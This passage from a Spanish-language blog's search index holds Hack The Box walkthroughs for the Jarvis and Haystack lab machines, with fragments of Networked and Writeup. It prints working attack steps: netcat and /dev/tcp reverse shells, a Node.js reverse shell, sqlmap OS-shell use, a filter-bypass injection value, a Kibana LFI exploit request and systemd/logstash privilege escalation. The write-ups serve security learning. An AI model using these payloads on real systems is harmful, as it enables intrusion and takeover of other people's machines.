\u0026gt; /etc/sysconfig/network-scripts/ifcfg-guly \u0026lt;\u0026lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=\u0026#34;^[a-zA-Z0-9_\\ /-]+$\u0026#34; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo \u0026#34;interface $var:\u0026#34; read x while [[ ! $x =~ $regexp ]]; do echo \u0026#34;wrong input, try again\u0026#34; echo \u0026#34;interface $var:\u0026#34; read x done echo $var=$x \u0026gt;\u0026gt; /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0   Antes de eso creamos un archivo el cual contiene una shell inversa, le damos permisos con el comando chmod +x archivo. Luego de eso ejecutamos el archivo con el comando sudo y le pasamos el comando bash /tmp/sh.\nPor otro lado tenemos a la escucha netcat y obtenemos una shell con el usuario root y nuestra bandera root.txt.\n","description":"Encontramos una pagina web donde pudimos subir una web shell realizando Bypass utilizando exiftool. Un CronJob nos permitio ejecutar una shell inversa y acceder al siguiente usuario. Escalamos privilegios ejecutando una shell a travez de un script de bash.","id":127,"section":"posts","tags":["Jail Escaping Bash","exiftool","cron"],"title":"Hack The Box - Networked","uri":"https://sckull.github.io/posts/networked/"},{"content":"  Al enumerar el sitio web descubrimos una vulnerabilidad SQL Injection y que con SQLmap obtuvimos una shell inversa. Mediante sudo y escapando un script en Python cambiamos al siguiente usuario. Los permisos de Systemctl permitió escalar privilegios creando un servicio nuevo.\nInformacion de la Maquina    Nombre Jarvis      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.143   Maker manulqwertyGhostpp7    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.7, 6.8, 6.1, 3.9, 3.2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp, version de servicio y script con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  root@sckull:~/htb/jarvis# masscan -p1-65535,U:1-65535 10.10.10.143 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-06 09:51:52 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.143 Discovered open port 64999/tcp on 10.10.10.143 Discovered open port 22/tcp on 10.10.10.143 # Nmap 7.70 scan initiated Sat Jul 6 03:58:17 2019 as: nmap -sV -sC -p80,64999,22 -o nmap_scsvp.scan 10.10.10.143 Nmap scan report for 10.10.10.143 Host is up (0.083s latency).\tPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel 64999/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 6 03:58:33 2019 -- 1 IP address (1 host up) scanned in 16.02 seconds   HTTP - Puerto 80 Realizamos un escaneo de archivos/directorios en la pagina web con DIRB.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114  ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Thu Jul 25 15:30:40 2019 URL_BASE: http://10.10.10.143/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://10.10.10.143/ ---- ==\u0026gt; DIRECTORY: http://10.10.10.143/css/ ==\u0026gt; DIRECTORY: http://10.10.10.143/fonts/ ==\u0026gt; DIRECTORY: http://10.10.10.143/images/ + http://10.10.10.143/index.php (CODE:200|SIZE:23628) ==\u0026gt; DIRECTORY: http://10.10.10.143/js/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/ + http://10.10.10.143/server-status (CODE:403|SIZE:300) ---- Entering directory: http://10.10.10.143/css/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/fonts/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/images/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/js/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/ ---- + http://10.10.10.143/phpmyadmin/ChangeLog (CODE:200|SIZE:19186) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/doc/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/examples/ + http://10.10.10.143/phpmyadmin/favicon.ico (CODE:200|SIZE:22486) + http://10.10.10.143/phpmyadmin/index.php (CODE:200|SIZE:15211) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/js/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/libraries/ + http://10.10.10.143/phpmyadmin/LICENSE (CODE:200|SIZE:18092) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/locale/ + http://10.10.10.143/phpmyadmin/phpinfo.php (CODE:200|SIZE:15215) + http://10.10.10.143/phpmyadmin/README (CODE:200|SIZE:1520) + http://10.10.10.143/phpmyadmin/robots.txt (CODE:200|SIZE:26) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/sql/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/templates/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/themes/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/tmp/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/vendor/ ---- Entering directory: http://10.10.10.143/phpmyadmin/doc/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/examples/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/js/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/libraries/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/locale/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/ ---- ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/frames/ + http://10.10.10.143/phpmyadmin/setup/index.php (CODE:200|SIZE:10541) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/lib/ ---- Entering directory: http://10.10.10.143/phpmyadmin/sql/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/templates/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/themes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/tmp/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/vendor/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/frames/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/lib/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ----------------- END_TIME: Thu Jul 25 16:38:46 2019 DOWNLOADED: 13836 - FOUND: 10   Encontramos un panel de administracion de phpmyadmin, al intentar ingresar con credenciales por default no fue posible.\nSQLi Realizamos una busqueda de vulnerabilidades dentro de la pagina web viendo parametros en urls, encontramos que en la pagina rooms se encuentra una vulnerabilidad de tipo sql injection.\n1  http://supersecurehotel.htb/room.php?cod=1   Utilizamos sqlmap para poder explotar esta vulnerabilidad y encontramos distintas bases de datos.\nSQLMAP Dentro de las bases de datos que encontramos no vimos nada que pudiese ayudar a obtener acceso a la maquina.\n1 2 3 4 5 6 7 8 9 10  sqlmap -u \u0026#34;10.10.10.143/room.php?cod=1\u0026#34; --dbs --batch available databases [7]: [*] etgkt [*] hotel [*] information_schema [*] mysql [*] performance_schema [*] secret [*] test   SQLMAP - OS-SHELL Utilizamos el parametro de sqlmap que nos devuelve una shell, en la cual podemos ejecutar comandos del sistema.\n1  sqlmap -u \u0026#34;10.10.10.143/room.php?cod=1\u0026#34; --os-shell   Obtenemos una shell con el usuario www-data:\nPara obtener una shell inversa creamos un archivo llamado shell.sh, configuramos un servidor con python y con la shell de sqlmap descargamos el archivo y lo ejecutamos.\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.174 7878 \u0026gt;/tmp/f   Shell inversa:\nShell - Pepper Enumeramos un poco el sistema y encontramos un script con el comando sudo -l -l, dicho archivo puede ser ejecutado por cualquier usuario con el comando sudo -u pepper ./simpler.py.\nAl analizar el codigo del archivo encontramos que al pasarle el parametro \u0026lsquo;-p\u0026rsquo; este ejecuta un ping sobre una IP que se le pasa, pero en la funcion no nos permite ejecutar un comando extra ademas de la IP que se le pasa.\n1 2 3 4 5 6 7 8  def exec_ping(): forbidden = [\u0026#39;\u0026amp;\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;-\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;||\u0026#39;,\u0026#39;|\u0026#39;,] command = input(\u0026#39;Enter an IP: \u0026#39;) for i in forbidden: if i in command: print \u0026#39;Got you\u0026#39; exit() os.system(\u0026#39;ping \u0026#39; + command)   Para poder escapar los caracteres \u0026amp;,;,-,``,||,| vamos a utilizar una variable la cual va ejecutar nuestra shell inversa, esta ultima la creamos en el directorio /tmp:\n1  nc -e /bin/bash 10.10.14.174 8989   Para obtener una shell con el usuario Pepper utilizamos los siguientes comandos, Ejecucion del script:\n1  sudo -u pepper /var/www/Admin-Utilities/simpler.py -p   Parametro cuando nos lo pida:\n1  \u0026#34;$(bash /tmp/x.sh)\u0026#34;   Obtenemos nuestra shell inversa y nuestra flag user.txt:\nYa que tenemos acceso al usuario Pepper agregamos nuestra llave publica a authorized_keys para poder ingresar mediante el servicio ssh.\nPRIVILEGE ESCALATION Realizamos una enumeracion de los archivos SUID en la maquina y encontramos /bin/systemctl.\nUtilizamos la informacion que nos proporciona GTFObins.\nUtilizamos los comandos:\n1  TF=/tmp/priv.service;echo \u0026#39;[Service]\u0026#39; \u0026gt; $TF;echo \u0026#39;Type=oneshot\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;ExecStart=/bin/sh -c \u0026#34;nc -e /bin/bash 10.10.14.174 1331\u0026#34;\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;[Install]\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;WantedBy=multi-user.target\u0026#39; \u0026gt;\u0026gt; $TF   1  systemctl link $TF;systemctl enable --now $TF   Obtenemos una shell como usuario root y nuestra flag root.txt:\nFlag:\n","description":"Al enumerar el sitio web descubrimos una vulnerabilidad SQL Injection y que con SQLmap obtuvimos una shell inversa. Mediante sudo y escapando un script en Python cambiamos al siguiente usuario. Los permisos de Systemctl permitió escalar privilegios creando un servicio nuevo.","id":128,"section":"posts","tags":["sqlmap","suid","systemctl"],"title":"Hack The Box - Jarvis","uri":"https://sckull.github.io/posts/jarvis/"},{"content":"  Enumeramos Elasticsearch en donde encontramos credenciales para obtener acceso por SSH. Encontramos Kibana el cual obtuvimos localmente con SSH que ademas explotamos una vulnerabilidad la cual nos dio acceso al siguiente usuario. Un CronJob con Logstash nos dio una shell como usuario root.\nInformacion de la Maquina    Nombre Haystack      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.115   Maker JoyDragon    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.6, 4.5, 6.1, 3.9, 5.5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y su servicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  masscan -p1-65535,U:1-65535 10.10.10.115 --rate=1000 -e tun1 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-30 00:02:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.115 Discovered open port 80/tcp on 10.10.10.115 Discovered open port 9200/tcp on 10.10.10.115 # Nmap 7.70 scan initiated Sat Jun 29 21:50:27 2019 as: nmap -sV -sC -p 9200,22,80 -o nmap.scan -e tun1 10.10.10.115 Nmap scan report for 10.10.10.115 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (text/html). 9200/tcp open http nginx 1.12.2 | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 29 21:51:09 2019 -- 1 IP address (1 host up) scanned in 42.27 seconds   HTTP GOBUSTER Realizamos una busqueda de directorios y archivos en el puerto 80 http con gobuster.\n1 2 3  root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115/ -w /usr/share/wordlists/dirb/common.txt -np -x php,txt,html -t 15 -q /index.html (Status: 200) /index.html (Status: 200)   Hint - Imagen Dentro de la imagen que se encuentra en el index del puerto 80 encontramos una cadena en base64 con lo que parece un hint.\nImagen:\nHint:\nGOBUSTER - Puerto 9200 Realizamos una busqueda de directorios y archivos en el puerto 9200 con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirb/common.txt -np -x txt,html -t 15 ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.115:9200/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : txt,html [+] Timeout : 10s ===================================================== 2019/06/29 19:25:40 Starting gobuster ===================================================== /_stats (Status: 200) /_template (Status: 200) /bank (Status: 200) /favicon.ico (Status: 200) /quotes (Status: 200) ===================================================== 2019/06/29 19:27:49 Finished =====================================================   Encontramos algunos directorios no muy comunes, al visitar este puerto con firefox encontramos que esta corriendo un servidor de Elasticsearch en su version 6.4.2.\nAl hacer una pequeña enumeracion encontramos 3 aliases, los cuales podemos utilizar para obtener informacion que esta almacenado en el servidor.\nEn el alias de .kibana encontramos una vulnerabilidad de LFI pero esta no afecta a este alias del servidor.\nPara obtener informacion de uno de los aliases (index) vamos a utilizar el siguiente query:\n Elasticsearch Query - 1 Elasticsearch Query - 2  1 2 3 4 5 6 7 8 9  curl -s -X GET \u0026#34;http://10.10.10.115:9200/bank/_search\u0026#34; -H \u0026#39;Content-Type: application/json\u0026#39; -d\u0026#39; { \u0026#34;size\u0026#34;: 5, \u0026#34;query\u0026#34;: { \u0026#34;match_all\u0026#34;: {} } } \u0026#39;   El resultado del query son 5 valores que se encuentran dentro de \u0026lsquo;bank\u0026rsquo;, podemos hacer lo mismo para los demas aliases que encontramos.\nEn este caso vamos a buscar dentro del alias \u0026lsquo;quotes\u0026rsquo;, como anteriormente obtuvimos un \u0026lsquo;hint\u0026rsquo; en la imagen del index vamos a buscar en este caso la palabra \u0026ldquo;clave\u0026rdquo; dentro de este alias.\n1  curl -s -X GET http://10.10.10.115:9200/quotes/_search?q=clave | jq .   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  \u0026#34;hits\u0026#34;: { \u0026#34;total\u0026#34;: 2, \u0026#34;max_score\u0026#34;: 5.9335938, \u0026#34;hits\u0026#34;: [ { \u0026#34;_index\u0026#34;: \u0026#34;quotes\u0026#34;, \u0026#34;_type\u0026#34;: \u0026#34;quote\u0026#34;, \u0026#34;_id\u0026#34;: \u0026#34;45\u0026#34;, \u0026#34;_score\u0026#34;: 5.9335938, \u0026#34;_source\u0026#34;: { \u0026#34;quote\u0026#34;: \u0026#34;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg \u0026#34; } }, { \u0026#34;_index\u0026#34;: \u0026#34;quotes\u0026#34;, \u0026#34;_type\u0026#34;: \u0026#34;quote\u0026#34;, \u0026#34;_id\u0026#34;: \u0026#34;111\u0026#34;, \u0026#34;_score\u0026#34;: 5.3459888, \u0026#34;_source\u0026#34;: { \u0026#34;quote\u0026#34;: \u0026#34;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=\u0026#34; } } ] }   Obtenemos dos resultados, los cuales nso muestran dos mensajes con una cadena en base64, al decodificarlos obtenemos credenciales.\n1 2  user: security pass: spanish.is.key   SSH - User flag Ya que obtuvimos nuestras credenciales nos logeamos atravez del servicio ssh, obtenemos una shell y nuestra flag user.txt.\nKibana 6.4.2 Como vimos anteriormente encontramos un alias .kibana el cual no era afectado en el puerto 9200, al obtener una shell pudimos hacer una enumeracion y encontrar el archivo de configuracion en este caso kibana.yml el cual se encuentra en la carpeta /etc/kibana/.\nVemos que la configuracion de este archivo tiene otro puerto en el cual esta corriendo el \u0026lsquo;backend\u0026rsquo; de la aplicacion, pero este solo esta disponible en la maquina de manera local.\nPara poder ver lo que hay en el puerto 5601 vamos a hacer port forwarding, para traerlo localmente a nuestra maquina. Para ello utilizamos el siguiente comando:\n1  ssh -L 5601:localhost:5601 security@10.10.10.115   Verificamos con netstat que el puerto este activo en nuestra maquina:\nVisitamos el puerto de manera local y nos muestra una plataforma, en este caso la de Kibana.\nLFI - Kibana 6.4.2 Como lo dije anteriormente la version de Kibana 6.4.2 tiene una vulnerabilidad la cual permite ejecutar codigo mediante archivo javascript u obtener archivos mediante LFI, al explotar esta vulnerabilidad de LFI esta solo se ve reflejada dentro del archivo \u0026lsquo;log\u0026rsquo; de Kibana.\nExecute This\nCVE-2018-17246\nYouTube Kibana\nReverse Shell NodeJS\nUna cosa importante que debemos saber es de que, los archivos que se reflejan dentro del log son archivos a los que Kibana tiene acceso. Para obtener una shell tenemos que escribir un archivo javascript dentro de la maquina en un lugar donde el usuario Kibana tenga acceso, el codigo de la Shell Inversa es:\n1 2 3 4 5 6 7 8 9 10 11 12  (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(1337, \u0026#34;10.10.14.85\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })();   Escribimos nuestra shell en /tmp/ y le dimos permisos para todos los usuarios:\nPara poder ejecutar nuestra shell inversa podemos hacer una solicitud con curl o hacerlo con firefox:\n1  curl \u0026#34;http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\u0026amp;apis=../../../../../../.../../../../tmp/shell.js\u0026#34; -vv   Por otro lado obtuvimos nuestra shell inversa como usuario Kibana:\nPRIVILEGE ESCALATION Para obtener una shell como usuario root primero enumeramos los crons que se ejecutan con el usuario root esto lo hacemos con pspy. Al realizar esto encontramos un proceso que se ejecuta cada minuto aproximadamente. Este proceso esta relacionado con logstash la cual es una herramienta que administra los logs.\nAl realizar una enumearcion de esta herramienta encontramos dentro de /etc/logstash los archivos de configuracion de esta herramienta. Dentro de la carpeta /etc/logstash/conf.d encontramos 3 archivos los cuales se utilizan para administrar logs.\nEl primer archivo (filter.conf) contiene una expresion regular la cual es utlizada para organizar los archivos log. En el segundo archivo (input.conf) encontramos que apunta a un archivo path =\u0026gt; /opt/kibana/logstash_* el cual va ser ejecutado por el programa con cierto intervalo de tiempo. En el tercer archivo (output.conf) este ultimo ejecuta el archivo o el codigo que se encuentra en el archivo (path) input.conf.\nfilter.conf:\n1 2 3 4 5 6 7  filter { if [type] == \u0026#34;execute\u0026#34; { grok { match =\u0026gt; { \u0026#34;message\u0026#34; =\u0026gt; \u0026#34;Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}\u0026#34; } } } }   input.conf:\n1 2 3 4 5 6 7 8 9 10  input { file { path =\u0026gt; \u0026#34;/opt/kibana/logstash_*\u0026#34; start_position =\u0026gt; \u0026#34;beginning\u0026#34; sincedb_path =\u0026gt; \u0026#34;/dev/null\u0026#34; stat_interval =\u0026gt; \u0026#34;10 second\u0026#34; type =\u0026gt; \u0026#34;execute\u0026#34; mode =\u0026gt; \u0026#34;read\u0026#34; } }   output.conf:\noutput { if [type] == \u0026quot;execute\u0026quot; { stdout { codec =\u0026gt; json } exec { command =\u0026gt; \u0026quot;%{comando} \u0026amp;\u0026quot; } } } Execute Cmd on Elasticsearch\nYa que este programa es ejecutado por el usuario root cada cierto tiempo, podemos escribir como usuario Kibana en el directorio /opt/kibana/ un archivo de shell inversa, pero este archivo debe de hacer match con la expresion regular que se encuentra en el archivo filter.conf: ('match =\u0026gt; { \u0026quot;message\u0026quot; =\u0026gt; \u0026quot;Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}\u0026quot; }').\nPara poder entender un poco mas las expresiones regulares de esta herramienta podemos verlo aqui:\n Grok Custom Patterns GrokPatterns  El codigo que debemos de agregar al archivo es:\n1  Ejecutar comando : /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.85/1598 0\u0026gt;\u0026amp;1   Para agregar el codigo a nuestro archivo utilizamos el siguiente comando:\n1  echo \u0026#34;Ejecutar comando : /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.85/1598 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; /opt/kibana/logstash_bash   El nombre de nuestro archivo debe de llevar en su nombre logstash_ (input.conf) para que pueda ser ejecutado en nuestro caso /opt/kibana/logstash_bash. Un problema que tiene esta herramienta es la ejecucion, especificamente por el nombre ya que por alguna razon utilizar el mismo nombre de archivo genera algun problema y no se ejecuta, por lo que al agregar o cambiar el comando que se desea ejecutar se debe de crear un nuevo archivo con diferente nombre.\nPor otro lado ponemos a la escucha netcat con el puerto que le pasamos a nuestra shell inversa, esperamos un poco a que se ejecute el cron de nuevo y obtenemos una shell como usuario root y nuestra flag root.txt.\nCodigo de nuestra shelll inversa se ejecuta:\nShell - ROOT ","description":"Enumeramos Elasticsearch en donde encontramos credenciales para obtener acceso por SSH. Encontramos Kibana el cual obtuvimos localmente con SSH que ademas explotamos una vulnerabilidad la cual nos dio acceso al siguiente usuario. Un CronJob con Logstash nos dio una shell como usuario root.","id":129,"section":"posts","tags":["elasticsearch","kibana 6.4.2","steganography","cron","logstash"],"title":"Hack The Box - Haystack","uri":"https://sckull.github.io/posts/haystack/"},{"content":"  Writeup es una maquina de HackTheBox. Encontramos una vulnerabilidad de SQL Injection en CMS Made Simple donde encontramos credenciales para acceder por SSH. Modificamos un script utilizado por un CronJob para escalar privilegios.\nInformacion de la Maquina    Nombre Writeup      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.138   Maker jkr    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.9, 6.9, 7.3, 2.7, 3.1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[5, 6, 8, 2, 4], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: 